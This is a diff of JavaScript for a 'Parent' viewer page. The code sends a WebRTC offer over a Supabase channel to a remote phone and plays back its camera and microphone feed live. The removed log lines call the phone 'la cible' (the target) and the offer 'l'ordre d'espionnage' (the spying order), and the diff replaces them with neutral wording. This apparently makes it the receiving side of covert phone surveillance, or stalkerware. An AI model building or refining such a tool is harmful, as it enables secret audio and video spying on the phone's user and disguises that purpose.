@@ -195,35 +195,44 @@ function renderMessage(m) {
 // Camera control
 // --- TRUE WEBRTC CAMERA RECEPTION ---
 let pc = null;
-const webrtcChannel = _supabase.channel('webrtc-room', { config: { broadcast: { self: false } } });
+let webrtcChannel = null;
 
 async function setupCameraStream() {
-    const videoPlaceholder = document.querySelector('.video-placeholder');
+    const streamStatus = document.getElementById('stream-status');
+    const startBtn = document.getElementById('btn-start-live');
     const liveVideo = document.getElementById('live-video');
-    const statusDot = document.querySelector('.status-dot');
-    
-    // Assure that video is visible
-    liveVideo.style.display = 'block';
-    if (document.getElementById('remote-live-img')) document.getElementById('remote-live-img').style.display='none';
-    
-    console.log("Initialisation du récepteur vidéo Parent...");
-    
+
+    if (startBtn) {
+        startBtn.onclick = async () => {
+            startBtn.disabled = true;
+            startBtn.innerHTML = '<i data-lucide="loader"></i> Connexion...';
+            lucide.createIcons();
+            
+            if (streamStatus) streamStatus.textContent = "Initialisation...";
+            await startWebRTC();
+        };
+    }
+}
+
+async function startWebRTC() {
+    const liveVideo = document.getElementById('live-video');
+    const streamStatus = document.getElementById('stream-status');
+    const videoPlaceholder = document.querySelector('.video-placeholder');
+
     if (pc) pc.close();
     pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
     
-    // Quand on reçoit le flux, on l'affiche avec le son !
+    webrtcChannel = _supabase.channel('webrtc-room', { config: { broadcast: { self: false } } });
+
     pc.ontrack = e => {
-        console.log("Flux reçu ! Lecture en cours...");
+        console.log("Flux reçu !");
+        if (streamStatus) streamStatus.textContent = "EN DIRECT";
         liveVideo.srcObject = e.streams[0];
-        // Ensure volume is on but muted attribute removed so audio plays
-        liveVideo.muted = false; 
-        liveVideo.volume = 1.0;
-        liveVideo.play();
+        liveVideo.style.display = 'block';
         if (videoPlaceholder) videoPlaceholder.style.display = 'none';
-        if (statusDot) {
-            statusDot.style.background = '#ef4444';
-            statusDot.textContent = 'REC';
-        }
+        
+        // Final attempt to play (important after user click)
+        liveVideo.play().catch(err => console.error("Play error:", err));
     };
 
     pc.onicecandidate = e => {
@@ -235,17 +244,28 @@ async function setupCameraStream() {
     webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
         const data = payload.payload;
         if (data.answer) {
-            console.log("Réponse de la cible reçue. Connexion en cours...");
+            console.log("Cible détectée !");
             await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
         } else if (data.candidate && pc) {
             await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
         }
     }).subscribe(async (status) => {
         if (status === 'SUBSCRIBED') {
-            console.log("Envoi de l'ordre d'espionnage (Offer)...");
+            if (streamStatus) streamStatus.textContent = "Signal envoyé...";
             const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
             await pc.setLocalDescription(offer);
             webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { offer: offer } });
+            
+            // Timeout if no answer
+            setTimeout(() => {
+                const startBtn = document.getElementById('btn-start-live');
+                if (streamStatus.textContent !== "EN DIRECT" && startBtn) {
+                    streamStatus.textContent = "Le téléphone ne répond pas. Réessayez.";
+                    startBtn.disabled = false;
+                    startBtn.innerHTML = '<i data-lucide="play"></i> Relancer';
+                    lucide.createIcons();
+                }
+            }, 10000);
         }
     });
 }
